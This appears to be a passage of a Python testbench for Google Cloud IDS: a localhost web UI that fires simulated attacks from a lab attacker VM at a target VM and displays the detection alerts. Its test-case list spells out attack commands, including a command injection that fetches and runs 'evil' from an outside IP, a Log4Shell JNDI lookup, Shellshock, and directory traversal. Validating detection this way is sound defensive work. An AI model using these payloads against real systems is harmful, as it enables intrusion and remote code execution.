              <span class="summary-metric-val" id="countAll">0</span>
            </div>
            <div class="summary-metric" id="filterCritBtn" data-sev="CRITICAL">
              <span class="summary-metric-label" style="color: var(--sev-critical-fg);">Critical</span>
              <span class="summary-metric-val" id="countCritical" style="color: var(--sev-critical-fg);">0</span>
            </div>
            <div class="summary-metric" id="filterHighBtn" data-sev="HIGH">
              <span class="summary-metric-label" style="color: var(--sev-high-fg);">High</span>
              <span class="summary-metric-val" id="countHigh" style="color: var(--sev-high-fg);">0</span>
            </div>
            <div class="summary-metric" id="filterMedBtn" data-sev="MEDIUM">
              <span class="summary-metric-label" style="color: var(--sev-medium-fg);">Medium</span>
              <span class="summary-metric-val" id="countMedium" style="color: var(--sev-medium-fg);">0</span>
            </div>
            <div class="summary-metric" id="filterLowBtn" data-sev="LOW">
              <span class="summary-metric-label" style="color: var(--sev-low-fg);">Low</span>
              <span class="summary-metric-val" id="countLow" style="color: var(--sev-low-fg);">0</span>
            </div>
          </div>

          <!-- View Switcher Tabs -->
          <div class="tab-row">
            <div class="tab-group">
              <button id="tabThreatsBtn" class="tab-btn active" type="button">Threat Alerts (ids.googleapis.com/threat)</button>
              <button id="tabTrafficBtn" class="tab-btn" type="button">Mirrored Traffic (ids.googleapis.com/traffic)</button>
            </div>
            <span class="mono-cell" id="activeFilterLabel" style="color: var(--text-secondary);">Filter: ALL</span>
          </div>

          <!-- Threat Alerts Table -->
          <div class="table-wrap" id="threatsTableContainer">
            <table>
              <thead>
                <tr>
                  <th>Timestamp (UTC)</th>
                  <th>Severity</th>
                  <th>Threat ID</th>
                  <th>Signature Name &amp; CVE</th>
                  <th>Category</th>
                  <th>Source ──&gt; Target</th>
                </tr>
              </thead>
              <tbody id="threatsTableBody">
              </tbody>
            </table>
          </div>

          <!-- Mirrored Traffic Table -->
          <div class="table-wrap" id="trafficTableContainer" style="display: none;">
            <table>
              <thead>
                <tr>
                  <th>Timestamp (UTC)</th>
                  <th>App / Proto</th>
                  <th>Source IP:Port</th>
                  <th>Destination IP:Port</th>
                  <th>Packets / Bytes</th>
                </tr>
              </thead>
              <tbody id="trafficTableBody">
              </tbody>
            </table>
          </div>
        </div>
      </section>
    </div>
  </main>

  <script nonce="{nonce}">
    (function() {{
      const csrfMeta = document.querySelector('meta[name="csrf-token"]');
      const CSRF_TOKEN = csrfMeta ? csrfMeta.getAttribute('content') : '';

      const projectInput = document.getElementById('projectInput');
      const refreshStatusBtn = document.getElementById('refreshStatusBtn');
      const refreshAlertsBtn = document.getElementById('refreshAlertsBtn');
      const runAllTestsBtn = document.getElementById('runAllTestsBtn');
      const consoleLink = document.getElementById('consoleLink');
      const terminalOutput = document.getElementById('terminalOutput');
      const testcaseList = document.getElementById('testcaseList');
      const threatsTableBody = document.getElementById('threatsTableBody');
      const trafficTableBody = document.getElementById('trafficTableBody');
      const threatsTableContainer = document.getElementById('threatsTableContainer');
      const trafficTableContainer = document.getElementById('trafficTableContainer');
      const tabThreatsBtn = document.getElementById('tabThreatsBtn');
      const tabTrafficBtn = document.getElementById('tabTrafficBtn');
      const activeFilterLabel = document.getElementById('activeFilterLabel');
      const lastUpdatedLabel = document.getElementById('lastUpdatedLabel');

      let cachedThreats = [];
      let cachedTraffic = [];
      let currentSeverityFilter = 'ALL';

      const TEST_CASES = [
        {{
          id: 'TC-01',
          name: 'OS Command Injection / WebLogin CGI Probe',
          severity: 'LOW',
          badgeClass: 'badge-low',
          signatures: 'Triggers Threat IDs 54469 & 58098 (Malicious Payload / Suspicious Download)',
          cmd: 'curl "http://192.168.10.10/weblogin.cgi?username=admin\';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil"'
        }},
        {{
          id: 'TC-02',
          name: 'Directory Traversal (WINNT/win.ini)',
          severity: 'HIGH / MEDIUM',
          badgeClass: 'badge-high',
          signatures: 'Triggers Threat IDs 30851 (win.ini Access) & 30844 (Directory Traversal)',
          cmd: 'curl "http://192.168.10.10/?item=../../../../WINNT/win.ini"'
        }},
        {{
          id: 'TC-03',
          name: 'GNU Bash Remote Code Execution (Shellshock CVE-2014-6271)',
          severity: 'CRITICAL',
          badgeClass: 'badge-critical',
          signatures: 'Triggers Threat ID 36729 (Bash Remote Code Execution Vulnerability)',
          cmd: 'curl -H "User-Agent: () {{ :; }}; 123.123.123.123:9999" "http://192.168.10.10/cgi-bin/test-critical"'
        }},
        {{
          id: 'TC-04',
          name: 'Apache Log4j JNDI Lookup Exploit Probe (Log4Shell CVE-2021-44228)',
          severity: 'CRITICAL',
          badgeClass: 'badge-critical',
          signatures: 'Triggers Threat ID 91991 (Apache Log4j Remote Code Execution Vulnerability)',
          cmd: 'curl -H "X-Api-Version: ${{jndi:ldap://123.123.123.123:1389/Basic/Command/...}}" "http://192.168.10.10/"'
        }},
        {{
          id: 'TC-05',
          name: 'EICAR Standard Anti-Malware Test Payload Transfer',
          severity: 'MEDIUM (VIRUS)',
          badgeClass: 'badge-medium',
          signatures: 'Triggers Threat IDs 100000 (Eicar Test File) & 39040 (Eicar File Detected)',
          cmd: 'curl "http://192.168.10.10/eicar.file"'
        }}
      ];

      function getBadgeClassForSeverity(sev) {{
        const s = (sev || '').toUpperCase();
        if (s === 'CRITICAL') return 'badge badge-critical';
        if (s === 'HIGH') return 'badge badge-high';
        if (s === 'MEDIUM') return 'badge badge-medium';
        return 'badge badge-low';
      }}

      function renderTestCases() {{
        testcaseList.replaceChildren();
        TEST_CASES.forEach(function(tc) {{
          const card = document.createElement('div');
          card.className = 'testcase-item';

          const top = document.createElement('div');
          top.className = 'testcase-top';

          const titleWrap = document.createElement('div');
          titleWrap.className = 'testcase-title';

          const badge = document.createElement('span');
          badge.className = 'badge ' + tc.badgeClass;
          badge.textContent = tc.id + ' • ' + tc.severity;

          const nameSpan = document.createElement('span');
          nameSpan.textContent = tc.name;

          titleWrap.appendChild(badge);
          titleWrap.appendChild(nameSpan);

          const runBtn = document.createElement('button');
          runBtn.type = 'button';
          runBtn.className = 'btn';
          runBtn.id = 'runBtn-' + tc.id;
          runBtn.textContent = '▶ Fire ' + tc.id;
          runBtn.addEventListener('click', function() {{
            triggerSimulation(tc.id, runBtn);
          }});

          top.appendChild(titleWrap);
          top.appendChild(runBtn);

          const codeBox = document.createElement('div');
          codeBox.className = 'testcase-code';
          codeBox.textContent = tc.cmd;

          const sigText = document.createElement('div');
          sigText.className = 'testcase-sig';
          sigText.textContent = tc.signatures;

          card.appendChild(top);
          card.appendChild(codeBox);
          card.appendChild(sigText);
          testcaseList.appendChild(card);
        }});
      }}

      async function loadPipelineStatus() {{
        const proj = projectInput.value.trim();
        consoleLink.setAttribute('href', 'https://console.cloud.google.com/net-security/ids/threats?project=' + encodeURIComponent(proj));
        refreshStatusBtn.disabled = true;
        refreshStatusBtn.textContent = 'Syncing...';

        try {{
          const resp = await fetch('/api/status?project=' + encodeURIComponent(proj));
          const data = await resp.json();

          // Step 1
          const ep = data.step1_ids_endpoint || {{}};
          const step1Badge = document.getElementById('step1Badge');
          step1Badge.textContent = ep.state || 'UNKNOWN';
          step1Badge.className = ep.state === 'READY' ? 'badge badge-ready' : 'badge badge-medium';
          document.getElementById('step1Title').textContent = ep.name || 'cloud-ids-endpoint-01';
          document.getElementById('step1Meta').textContent = 'IP: ' + (ep.endpoint_ip || 'N/A') + ' • Sev: ' + (ep.severity || 'INFORMATIONAL');

          // Step 2
          const vms = data.step2_target_vms || [];
          const runningCount = vms.filter(function(v) {{ return v.status === 'RUNNING'; }}).length;
          const step2Badge = document.getElementById('step2Badge');
          step2Badge.textContent = runningCount + '/' + Math.max(vms.length, 2) + ' RUNNING';
          step2Badge.className = runningCount >= 2 ? 'badge badge-ready' : 'badge badge-medium';
          if (vms.length > 0) {{
            const summary = vms.map(function(v) {{ return v.name + ' (' + v.internal_ip + ')'; }}).join(' • ');
            document.getElementById('step2Meta').textContent = summary;
          }}

          // Step 3
          const pm = data.step3_packet_mirroring || {{}};
          const step3Badge = document.getElementById('step3Badge');
          step3Badge.textContent = pm.enable === 'TRUE' ? 'ENABLED' : (pm.enable || 'UNKNOWN');
          step3Badge.className = pm.enable === 'TRUE' ? 'badge badge-ready' : 'badge badge-medium';
          document.getElementById('step3Title').textContent = pm.name || 'cloud-ids-packet-mirroring';
          document.getElementById('step3Meta').textContent = 'Direction: ' + (pm.direction || 'BOTH') + ' • Subnets: ' + ((pm.mirrored_subnets || []).join(', ') || 'cloud-ids-subnet');
        }} catch (err) {{
          document.getElementById('step1Badge').textContent = 'ERROR';
        }} finally {{
          refreshStatusBtn.disabled = false;
          refreshStatusBtn.textContent = 'Sync Pipeline Status';
        }}
      }}

      async function triggerSimulation(testId, btnElement) {{
        const proj = projectInput.value.trim();
        const originalText = btnElement.textContent;
        btnElement.disabled = true;
        runAllTestsBtn.disabled = true;
        btnElement.textContent = '⏳ Sending...';

        terminalOutput.textContent = '[' + new Date().toISOString() + '] Opening IAP SSH tunnel to ids-attacker-client in ' + proj + '...\\n' +
          'Transmitting ' + testId + ' attack simulation packets across mirrored subnet (192.168.10.20 -> 192.168.10.10)...';

        try {{
          const resp = await fetch('/api/simulate', {{
            method: 'POST',
            headers: {{
              'Content-Type': 'application/json',
              'X-CSRF-Token': CSRF_TOKEN
            }},
            body: JSON.stringify({{ project_id: proj, test_id: testId }})
          }});
          const data = await resp.json();

          if (data.ok) {{
            terminalOutput.textContent =
              '✓ IAP SSH Simulation Completed in ' + data.elapsed_ms + ' ms (' + data.timestamp + ')\\n' +
              'Attacker VM: ' + data.attacker_vm + ' (192.168.10.20) ──> Target Server: ' + data.target_ip + '\\n\\n' +
              (data.stdout || 'Packets transmitted.') + '\\n\\n' +
              '>>> Packets mirrored to Cloud IDS Collector ILB. Refreshing Threat Logs in 5 seconds...';
            setTimeout(loadAlerts, 5000);
          }} else {{
            terminalOutput.textContent = '⚠️ Simulation error:\\n' + (data.stderr || data.error || 'Unknown error');
          }}
        }} catch (err) {{
          terminalOutput.textContent = '⚠️ Request failed: ' + err.message;
        }} finally {{
          btnElement.disabled = false;
          runAllTestsBtn.disabled = false;
          btnElement.textContent = originalText;
        }}
      }}

      function renderThreatsTable() {{
        threatsTableBody.replaceChildren();
        const filtered = cachedThreats.filter(function(t) {{
          if (currentSeverityFilter === 'ALL') return true;
          return (t.severity || '').toUpperCase() === currentSeverityFilter;
        }});

        if (filtered.length === 0) {{
          const tr = document.createElement('tr');
          const td = document.createElement('td');
          td.colSpan = 6;
          td.style.textAlign = 'center';
          td.style.color = 'var(--text-muted)';
          td.style.padding = '1.75rem';
          td.textContent = 'No matching Cloud IDS threat alerts found for filter: ' + currentSeverityFilter;
          tr.appendChild(td);
          threatsTableBody.appendChild(tr);
          return;
        }}

        filtered.forEach(function(item, idx) {{
          const tr = document.createElement('tr');
          tr.className = 'alert-row';

          const tdTime = document.createElement('td');
          tdTime.className = 'mono-cell';
          tdTime.textContent = (item.timestamp || '').replace('T', ' ').replace(/\\.\\d+Z$/, 'Z');

          const tdSev = document.createElement('td');
          const sevBadge = document.createElement('span');
          sevBadge.className = getBadgeClassForSeverity(item.severity);
          sevBadge.textContent = item.severity || 'INFO';
          tdSev.appendChild(sevBadge);

          const tdId = document.createElement('td');
          tdId.className = 'mono-cell';
          tdId.textContent = item.threat_id || '-';

          const tdName = document.createElement('td');
          const nameStrong = document.createElement('div');
          nameStrong.style.fontWeight = '600';
          nameStrong.textContent = item.name || 'Unknown Threat';
          tdName.appendChild(nameStrong);

          if (item.cves && item.cves.length > 0) {{
            const cveSub = document.createElement('div');
            cveSub.className = 'mono-cell';
            cveSub.style.color = 'var(--accent-cyan)';
            cveSub.style.fontSize = '0.69rem';
            cveSub.textContent = 'CVE: ' + item.cves.join(', ');
            tdName.appendChild(cveSub);
          }}

          const tdCat = document.createElement('td');
          tdCat.className = 'mono-cell';
          tdCat.textContent = item.category || '-';

          const tdFlow = document.createElement('td');
          tdFlow.className = 'mono-cell';
          tdFlow.textContent = (item.source_ip || '?') + ' ──> ' + (item.destination_ip || '?') + ':' + (item.destination_port || '80');

          tr.appendChild(tdTime);
          tr.appendChild(tdSev);
          tr.appendChild(tdId);
          tr.appendChild(tdName);
          tr.appendChild(tdCat);
          tr.appendChild(tdFlow);

          const detailTr = document.createElement('tr');
          detailTr.style.display = 'none';
          const detailTd = document.createElement('td');
          detailTd.colSpan = 6;
          detailTd.style.padding = '0';

          const drawer = document.createElement('div');
          drawer.className = 'forensic-drawer';
          drawer.textContent =
            'Forensic Alert Details (Click row to toggle):\\n' +
            '  • Signature Name : ' + (item.name || '') + ' (Threat ID: ' + (item.threat_id || '') + ')\\n' +
            '  • URI / Filename : ' + (item.uri || 'N/A') + '\\n' +
            '  • Application    : ' + (item.application || 'web-browsing') + ' (' + (item.protocol || 'TCP') + ')\\n' +
            '  • Description    : ' + (item.details || 'N/A');

          detailTd.appendChild(drawer);
          detailTr.appendChild(detailTd);

          tr.addEventListener('click', function() {{
            detailTr.style.display = detailTr.style.display === 'none' ? 'table-row' : 'none';
          }});

          threatsTableBody.appendChild(tr);
          threatsTableBody.appendChild(detailTr);
        }});
      }}

      function renderTrafficTable() {{
        trafficTableBody.replaceChildren();
        if (cachedTraffic.length === 0) {{
          const tr = document.createElement('tr');
          const td = document.createElement('td');
          td.colSpan = 5;
          td.style.textAlign = 'center';
          td.style.color = 'var(--text-muted)';
          td.style.padding = '1.75rem';
          td.textContent = 'No mirrored traffic logs returned.';
          tr.appendChild(td);
          trafficTableBody.appendChild(tr);
          return;
        }}

        cachedTraffic.forEach(function(pkt) {{
          const tr = document.createElement('tr');

          const tdTime = document.createElement('td');
          tdTime.className = 'mono-cell';
          tdTime.textContent = (pkt.timestamp || '').replace('T', ' ').replace(/\\.\\d+Z$/, 'Z');

          const tdApp = document.createElement('td');
          tdApp.className = 'mono-cell';
          tdApp.textContent = (pkt.application || 'unknown') + ' (' + (pkt.protocol || 'TCP') + ')';

          const tdSrc = document.createElement('td');
          tdSrc.className = 'mono-cell';
          tdSrc.textContent = (pkt.source_ip || '') + ':' + (pkt.source_port || '');

          const tdDst = document.createElement('td');
          tdDst.className = 'mono-cell';
          tdDst.textContent = (pkt.destination_ip || '') + ':' + (pkt.destination_port || '');

          const tdBytes = document.createElement('td');
          tdBytes.className = 'mono-cell';
          tdBytes.textContent = (pkt.total_packets || '0') + ' pkts / ' + (pkt.total_bytes || '0') + ' B';

          tr.appendChild(tdTime);
          tr.appendChild(tdApp);
          tr.appendChild(tdSrc);
          tr.appendChild(tdDst);
          tr.appendChild(tdBytes);
          trafficTableBody.appendChild(tr);
        }});
      }}

      async function loadAlerts() {{
        const proj = projectInput.value.trim();
        refreshAlertsBtn.disabled = true;
        refreshAlertsBtn.textContent = 'Loading...';

        try {{
          const resp = await fetch('/api/alerts?project=' + encodeURIComponent(proj) + '&limit=30');
          const data = await resp.json();

          cachedThreats = data.threats || [];
          cachedTraffic = data.traffic || [];
          const counts = data.severity_counts || {{}};

          document.getElementById('countAll').textContent = String(cachedThreats.length);
          document.getElementById('countCritical').textContent = String(counts.CRITICAL || 0);
          document.getElementById('countHigh').textContent = String(counts.HIGH || 0);
          document.getElementById('countMedium').textContent = String(counts.MEDIUM || 0);
          document.getElementById('countLow').textContent = String(counts.LOW || 0);

          document.getElementById('step5Badge').textContent = cachedThreats.length + ' ALERTS DETECTED';
          lastUpdatedLabel.textContent = 'Synced ' + new Date().toLocaleTimeString();

          renderThreatsTable();
          renderTrafficTable();
        }} catch (err) {{
          lastUpdatedLabel.textContent = 'Sync failed';
        }} finally {{
          refreshAlertsBtn.disabled = false;
          refreshAlertsBtn.textContent = 'Refresh Threat Logs';
        }}
      }}

      // Wire events
      refreshStatusBtn.addEventListener('click', loadPipelineStatus);
      refreshAlertsBtn.addEventListener('click', loadAlerts);
      runAllTestsBtn.addEventListener('click', function() {{
        triggerSimulation('ALL', runAllTestsBtn);
      }});

      document.querySelectorAll('.summary-metric').forEach(function(box) {{
        box.addEventListener('click', function() {{
          currentSeverityFilter = box.getAttribute('data-sev') || 'ALL';
          activeFilterLabel.textContent = 'Filter: ' + currentSeverityFilter;
          renderThreatsTable();
        }});
      }});

      tabThreatsBtn.addEventListener('click', function() {{
        tabThreatsBtn.className = 'tab-btn active';
        tabTrafficBtn.className = 'tab-btn';
        threatsTableContainer.style.display = 'block';
        trafficTableContainer.style.display = 'none';
      }});

      tabTrafficBtn.addEventListener('click', function() {{
        tabTrafficBtn.className = 'tab-btn active';
        tabThreatsBtn.className = 'tab-btn';
        trafficTableContainer.style.display = 'block';
        threatsTableContainer.style.display = 'none';
      }});

      renderTestCases();
      loadPipelineStatus();
      loadAlerts();
    }})();
  </script>
</body>
</html>
"""


class CloudIDSTestbenchHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:
        # Suppress verbose standard logging or sensitive query params
        pass

    def _send_security_headers(self, status: int, content_type: str, nonce: str = "") -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        if nonce:
            csp = (
                f"default-src 'self'; "
                f"script-src 'self' 'nonce-{nonce}'; "
                f"style-src 'self' 'nonce-{nonce}' https://fonts.googleapis.com; "
                f"font-src 'self' https://fonts.gstatic.com; "
                f"connect-src 'self'; "
                f"object-src 'none'; "
                f"frame-ancestors 'none'; "
                f"base-uri 'self';"
            )
        else:
            csp = "default-src 'none'; frame-ancestors 'none';"
        self.send_header("Content-Security-Policy", csp)
        self.end_headers()

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path in ("", "/", "/index.html"):
            nonce = secrets.token_urlsafe(16)
            html_doc = render_html_page(nonce, CSRF_TOKEN, DEFAULT_CFG["project_id"])
            self._send_security_headers(200, "text/html; charset=utf-8", nonce=nonce)
            self.wfile.write(html_doc.encode("utf-8"))
            return

        if parsed.path == "/api/status":
            proj = (qs.get("project") or [DEFAULT_CFG["project_id"]])[0]
            payload = fetch_infrastructure_status(proj)
            self._send_security_headers(200, "application/json; charset=utf-8")
            self.wfile.write(json.dumps(payload).encode("utf-8"))
            return

        if parsed.path == "/api/alerts":
            proj = (qs.get("project") or [DEFAULT_CFG["project_id"]])[0]
            try:
                limit = int((qs.get("limit") or ["25"])[0])
            except ValueError:
                limit = 25
            payload = fetch_cloud_ids_logs(proj, limit=limit)
            self._send_security_headers(200, "application/json; charset=utf-8")
            self.wfile.write(json.dumps(payload).encode("utf-8"))
            return

        self._send_security_headers(404, "application/json; charset=utf-8")
        self.wfile.write(json.dumps({"error": "Not found"}).encode("utf-8"))

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        client_csrf = self.headers.get("X-CSRF-Token", "")
        if not secrets.compare_digest(client_csrf, CSRF_TOKEN):
            self._send_security_headers(403, "application/json; charset=utf-8")
            self.wfile.write(json.dumps({"ok": False, "error": "Invalid CSRF token"}).encode("utf-8"))
            return

        try:
            length = min(int(self.headers.get("Content-Length", "0")), 8192)
        except ValueError:
            length = 0
        raw_body = self.rfile.read(length).decode("utf-8") if length > 0 else "{}"
        try:
            body = json.loads(raw_body)
        except Exception:
            body = {}

        if parsed.path == "/api/simulate":
            proj = body.get("project_id", DEFAULT_CFG["project_id"])
            test_id = str(body.get("test_id", "ALL")).upper()
            result = execute_attack_simulation(proj, test_id)
            self._send_security_headers(200, "application/json; charset=utf-8")
            self.wfile.write(json.dumps(result).encode("utf-8"))
            return

        self._send_security_headers(404, "application/json; charset=utf-8")
        self.wfile.write(json.dumps({"error": "Not found"}).encode("utf-8"))


def main() -> None:
    parser = argparse.ArgumentParser(description="Cloud IDS Interactive Testbench UI Server")
    parser.add_argument("--project", default=DEFAULT_CFG["project_id"], help="Target GCP Project ID")
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", "8085")), help="Port to listen on")
    args = parser.parse_args()

    DEFAULT_CFG["project_id"] = validate_project_id(args.project)

    # Mandatory secure coding rule: bind strictly to 127.0.0.1 when running locally
    bind_host = "127.0.0.1"
    server = http.server.ThreadingHTTPServer((bind_host, args.port), CloudIDSTestbenchHandler)
    print("=" * 72)
    print("  GOOGLE CLOUD IDS — INTERACTIVE TEST & THREAT DETECTION UI")
    print("=" * 72)
    print(f"  • URL            : http://{bind_host}:{args.port}")
    print(f"  • Target Project : {DEFAULT_CFG['project_id']}")
    print(f"  • IDS Endpoint   : {DEFAULT_CFG['ids_endpoint_name']} ({DEFAULT_CFG['zone']})")
    print(f"  • Attacker VM    : {DEFAULT_CFG['client_vm_name']} (192.168.10.20)")
    print(f"  • Target VM      : {DEFAULT_CFG['server_vm_name']} (192.168.10.10)")
    print("=" * 72)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()


if __name__ == "__main__":
    main()
